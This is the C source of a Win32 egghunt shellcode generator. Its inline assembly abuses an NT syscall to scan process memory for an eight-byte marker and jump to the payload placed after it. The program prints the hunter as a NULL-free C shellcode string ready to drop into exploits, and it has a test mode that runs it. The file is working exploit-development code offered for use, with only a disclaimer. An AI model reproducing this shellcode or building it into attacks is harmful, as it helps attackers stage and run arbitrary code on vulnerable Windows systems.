/*
 * Optimized egghunt shellcode for win32 (32 bytes)
 *
 * Description
 *
 *    This code works by abusing an NT syscall (NtAccessCheckAndAuditAlaram)
 *    whereby it uses the kernel to validate whether or not a set of addresses
 *    is valid, and, if it is, whether or not they match the 8 byte egg we're
 *    searching for.  The egg byte egg consists of 4 bytes of executable
 *    assembly that will appear 2 times, once after the other.  For instance,
 *    the egg 0x50905090 would be used with the following assembly:
 *
 *       nop
 *       push eax
 *       nop
 *       push eax
 *       nop
 *       push eax
 *       nop
 *       push eax
 *
 *    When the egg hunter searches for 0x50905090 it will eventually
 *    match with the above assembly and jump to it, starting at the
 *    first nop.  
 *
 *    The use of NtAccessCheckAndAuditAlarm may have problems if the thread
 *    is using an impersonation token.  However, this is the most portable
 *    system call number to use.
 *
 * Targets
 *
 *    NT/2K/XP/2K3
 *
 * Usage
 *
 *    $ egghunt.exe
 *    Usage: egghunt.exe [test | cstyle] [4 byte hex egg]
 *    
 *    To generate usable code (with an egg of 42 41 42 41):
 *
 *    $ egghunt.exe cstyle 0x41424142
 *
 *    To test the code:
 *
 *    $ egghunt.exe test
 *
 * Features/Quirks
 *
 *    * No NULLs.
 *
 * Disclaimer
 *
 *    The author cannot be held responsible for how this code is used.
 *
 * Compile
 *
 *    cl egghunt.c /link /debug
 *
 * Credits
 *
 *    Props go out to spoonm, optyx, trew, and johnycsh for optimization
 *    tips 'n tricks over the course of this shtuff.
 *
 * skape
 * mmiller@hick.org
 */
#include <stdio.h>

#define EGG_OFFSET       18
#define SET_EGG(sc, egg) *(unsigned long *)((sc) + EGG_OFFSET) = (egg)

void __declspec(naked) egghunt_begin()
{
	__asm
	{
		entry:
			// You could put an xor edx, edx here to make the search somewhat
			// quicker, but given page aligned searching, it really isn't that bad
			// to omit it, and it saves two bytes.
		loop_inc_page:
			or    dx, 0x0fff                    // Add PAGE_SIZE-1 to edx
		loop_inc_one:
			inc   edx                           // Increment our pointer by one
		loop_check:
			push  edx                           // Save edx
			push  0x2                           // Push NtAccessCheckAndAuditAlarm
			pop   eax                           // Pop into eax
			int   0x2e                          // Perform the syscall
			cmp   al, 0x05                      // Did we get 0xc0000005 (ACCESS_VIOLATION) ?
			pop   edx                           // Restore edx
		loop_check_8_valid: 
			je    loop_inc_page                 // Yes, invalid ptr, go to the next page

		is_egg:
			mov   eax, 0x50905090               // Throw our egg in eax
			mov   edi, edx                      // Set edi to the pointer we validated
			scasd                               // Compare the dword in edi to eax
			jnz   loop_inc_one                  // No match? Increment the pointer by one
			scasd                               // Compare the dword in edi to eax again (which is now edx + 4)
			jnz   loop_inc_one                  // No match? Increment the pointer by one

		matched:
			jmp   edi                           // Found the egg.  Jump 8 bytes past it into our code.
	}
}

void __declspec(naked) egghunt_end()
{
	// These first 8 bytes make up our egg
	__asm
	{
		nop
		push eax
		nop
		push eax
		nop
		push eax
		nop
		push eax
	}

	printf("Egg has been found.\n");

	exit(0);
}

void __declspec(naked) egghunt_end_end()
{
	__asm ret
}

int main(int argc, char **argv)
{
	if (argc == 1)
	{
		fprintf(stdout, "Usage: %s [test | cstyle] [4 byte egg hex (eg: 0x41424142)]\n", argv[0]);
		return 0;
	}

	if (!strcmp(argv[1], "test"))
		egghunt_begin();
	else if (!strcmp(argv[1], "cstyle"))
	{
		unsigned char *start = (unsigned char *)((unsigned char *)egghunt_begin);
		unsigned char *stop  = (unsigned char *)((unsigned char *)egghunt_end);
		unsigned char *copy  = NULL;
		unsigned char *c     = NULL;
		unsigned long x      = 0, length, y = 0, egg = 0x50905090;

		// Calculate the actual address in memory of the begin/end function based off their relative jmp points.
		start   += *(unsigned long *)((unsigned char *)egghunt_begin + 1) + 5;
		stop    += *(unsigned long *)((unsigned char *)egghunt_end + 1) + 5;
		length   = stop - start;

		if (!(copy = (unsigned char *)malloc(length)))
		{
			printf("allocation failed\n");
			return 0;
		}

		memcpy(copy, start, length);

		if (argc >= 3)
			egg = strtoul(argv[2], NULL, 16);

		SET_EGG(copy, egg);

		fprintf(stdout, "// %lu byte egghunt shellcode (egg=0x%.8x)\n\n", length, egg);
		fprintf(stdout, "unsigned char egghunt[] = \"");

		for (x = 0;
		     x < length;
		     x++)
			fprintf(stdout, "\\x%2.2x", copy[x]);

		fprintf(stdout, "\";\n\n");

		free(copy);
	}
	else
		fprintf(stdout, "%s: invalid option\n", argv[0]);

	return 1;
}
